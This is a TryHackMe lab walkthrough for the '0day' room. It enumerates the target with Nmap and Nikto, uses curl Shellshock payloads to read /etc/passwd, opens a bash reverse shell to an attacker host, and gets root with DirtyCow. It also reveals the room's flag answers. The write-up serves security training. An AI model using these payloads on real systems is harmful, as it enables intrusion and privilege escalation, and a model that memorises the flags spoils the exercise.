# 0day — TryHackMe Walkthrough

> Exploit Ubuntu, like a Turtle in a Hurricane.

<p align="center"><a href="https://tryhackme.com/room/0day"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/685bfa4247db500c68e95d446359ea05.jpeg" alt="0day" border="0"></a></p>

<p align="center">
<a href="https://tryhackme.com/room/0day"><img src="https://img.shields.io/badge/TryHackMe-0day-red?style=flat&logo=tryhackme" /></a>
<img src="https://img.shields.io/badge/Difficulty-Easy-green" />
<img src="https://img.shields.io/badge/Platform-Linux-blue?logo=linux" />
<img src="https://img.shields.io/badge/Focus-Web%20Exploitation%20%7C%20Privilege%20Escalation-orange" />
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | CVE-2014-6271 (Shellshock) |
| 4 | DirtyCow Privilege Escalation |

## Learning Objectives

- Perform network and service enumeration against a Linux target using Nmap
- Use Nikto to identify web vulnerabilities, including outdated CGI scripts
- Exploit the Shellshock vulnerability (CVE-2014-6271) via a vulnerable CGI script
- Obtain a reverse shell as a low-privileged web user
- Escalate privileges to root using the DirtyCow kernel exploit

## Prerequisites

- Kali Linux (or similar attacking machine) with Nmap, Nikto, and curl installed
- A netcat listener for catching reverse shells
- The DirtyCow exploit binary (cow) and a copy of socat, transferred to the target
- VPN connection to the TryHackMe network active before scanning

---

## [Task 1] — Flags

### Step 1 — Scan the target with Nmap

**Approach:** Start with a full Nmap scan covering service versions, default scripts, and OS detection to get a complete picture of what is running on the target before digging deeper.

```
kali@kali:~/CTFs/tryhackme/0day$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 10:35 CET
Nmap scan report for Machine_IP
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   32.03 ms 10.8.0.1
2   32.42 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.27 seconds
```

> **Note:** Only two ports are open. SSH is running an Ubuntu build of OpenSSH 6.6.1p1, which is itself a fairly old release, and Apache 2.4.7 is serving a website on port 80. Apache 2.4.7 dates from early 2014, which lines up with the era of the Shellshock vulnerability, so the web server is worth prioritising. The OS fingerprint detail was trimmed since it adds no useful information here, but the key takeaway is that this is an older Ubuntu 14.04-era box.

### Step 2 — Enumerate the web server with Nikto

**Approach:** Run Nikto against port 80 to scan for misconfigurations, interesting directories, and known vulnerabilities tied to the Apache version and any exposed scripts.

```
kali@kali:~/CTFs/tryhackme/0day$ nikto --url Machine_IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          Machine_IP
+ Target Hostname:    Machine_IP
+ Target Port:        80
+ Start Time:         2020-10-25 10:38:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ 8699 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2020-10-25 10:44:25 (GMT1) (349 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

> **Note:** The standout result here is the direct flag that /cgi-bin/test.cgi is vulnerable to Shellshock, CVE-2014-6271. Shellshock is a bug in Bash where specially crafted environment variables can cause Bash to execute arbitrary commands. Because CGI scripts pass HTTP headers like the User-Agent into environment variables before handing off to Bash, an attacker can smuggle commands through those headers. Several other directories such as /admin/, /backup/, and /secret/ are flagged as interesting, but the CGI script is the clear path forward since it gives code execution directly.

### Step 3 — Confirm the Shellshock vulnerability

**Approach:** Browse to the vulnerable CGI script in a browser or with curl to confirm it responds, then prepare to test the Shellshock payload against it.

```
http://Machine_IP/cgi-bin/test.cgi
```

> **Note:** This step is simply confirming the script exists and is reachable before attempting exploitation. The script itself doesn't need to do anything special; Bash processing the malicious User-Agent header is enough.

### Step 4 — Exploit Shellshock to read /etc/passwd

**Approach:** Send a crafted User-Agent header containing the Shellshock payload. The payload defines a function, then appends commands that Bash will execute when it parses the environment variable. Here the command run is cat /etc/passwd.

```
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://Machine_IP/cgi-bin/test.cgi
```

```
kali@kali:~/CTFs/tryhackme/0day$ curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://Machine_IP/cgi-bin/test.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

> **Note:** The payload worked, confirming code execution as the web server user. The output also reveals a normal user account, ryan, with a real login shell, which is a useful target for later privilege escalation or lateral movement.

### Step 5 — Confirm the current user

**Approach:** Run whoami through the same Shellshock technique to confirm exactly which user the web server process is executing as.

```
kali@kali:~/CTFs/tryhackme/0day$ curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://Machine_IP/cgi-bin/test.cgi
www-data
```

> **Note:** Commands are running as www-data, the default low-privileged Apache user on Debian-based systems. This is expected, web servers should never run as root, but it confirms a starting foothold rather than immediate full access.

### Step 6 — Get a reverse shell

**Approach:** Use the same Shellshock payload, but this time the command spawns a Bash reverse shell back to the attacking machine on port 9001. A netcat listener must be running on the attacker's machine first.

```
kali@kali:~/CTFs/tryhackme/0day$ curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/9001 0>&1';" http://Machine_IP/cgi-bin/test.cgi
```

> **Note:** This payload tells Bash to open a TCP connection back to the attacker on port 9001 and bind an interactive shell to that connection. Once the listener catches it, the attacker has an interactive shell as www-data, which is far more useful than one-shot curl commands.

### Step 7 — Explore the filesystem and grab the user flag

**Approach:** With an interactive shell, check the kernel version (useful for later privilege escalation), explore the web root, and look in /home for user directories that might contain a flag.

```
www-data@ubuntu:/usr/lib/cgi-bin$ uname -r
3.13.0-32-generic
www-data@ubuntu:/usr/lib/cgi-bin$ ls
test.cgi
www-data@ubuntu:/usr/lib/cgi-bin$ cd ~
www-data@ubuntu:/var/www$ ls
html
www-data@ubuntu:/var/www$ ls /home
ryan
www-data@ubuntu:/var/www$ ls /home/ryan/
user.txt
www-data@ubuntu:/var/www$ cat /home/ryan/user.txt
THM{Sh3llSh0ck_r0ckz}
www-data@ubuntu:/var/www$
```

> **Note:** The kernel version, 3.13.0-32, is critical here. This kernel range is vulnerable to DirtyCow (CVE-2016-5195), a privilege escalation bug in the Linux kernel's memory handling that allows a low-privileged user to gain write access to read-only files, including files owned by root. The user flag was readable directly from ryan's home directory because of loose file permissions.

### Step 8 — Escalate privileges with DirtyCow

**Approach:** Use a precompiled DirtyCow exploit binary, already placed in /tmp, to overwrite /usr/bin/passwd and pop a root shell. Make it executable and run it.

```
www-data@ubuntu:/tmp$ ls
cow  socat
www-data@ubuntu:/tmp$ chmod +x cow
www-data@ubuntu:/tmp$ ./cow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
thread stopped
root@ubuntu:/tmp# cat /root/root.txt
THM{g00d_j0b_0day_is_Pleased}
```

> **Note:** DirtyCow exploits a race condition in the kernel's copy-on-write mechanism. By rapidly writing to a memory-mapped copy of a file while simultaneously triggering a write to the original, the exploit tricks the kernel into writing attacker-controlled data into a file it should be protecting, in this case /usr/bin/passwd. Once passwd is overwritten with a malicious version, running it grants a root shell. A reference proof-of-concept collection for this vulnerability is available at the DirtyCow PoC repository: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs. The root flag is now readable, completing the room.

---

### Task 1.1 — What is the content of user.txt?

<details><summary>Reveal Answer</summary>
THM{Sh3llSh0ck_r0ckz}
</details>

### Task 1.2 — What is the content of root.txt?

<details><summary>Reveal Answer</summary>
THM{g00d_j0b_0day_is_Pleased}
</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Ran Nmap full scan against the target | Identified SSH and an outdated Apache web server |
| 2 | Ran Nikto against the web server | Found /cgi-bin/test.cgi flagged as vulnerable to Shellshock |
| 3 | Browsed to the vulnerable CGI script | Confirmed the script was reachable |
| 4 | Sent a Shellshock payload to read /etc/passwd | Achieved command execution and identified the ryan user account |
| 5 | Ran whoami via Shellshock | Confirmed commands execute as www-data |
| 6 | Sent a Shellshock payload to spawn a reverse shell | Obtained an interactive shell as www-data |
| 7 | Explored the filesystem and checked kernel version | Found a vulnerable kernel and read the user flag |
| 8 | Ran a precompiled DirtyCow exploit from /tmp | Escalated to root and read the root flag |
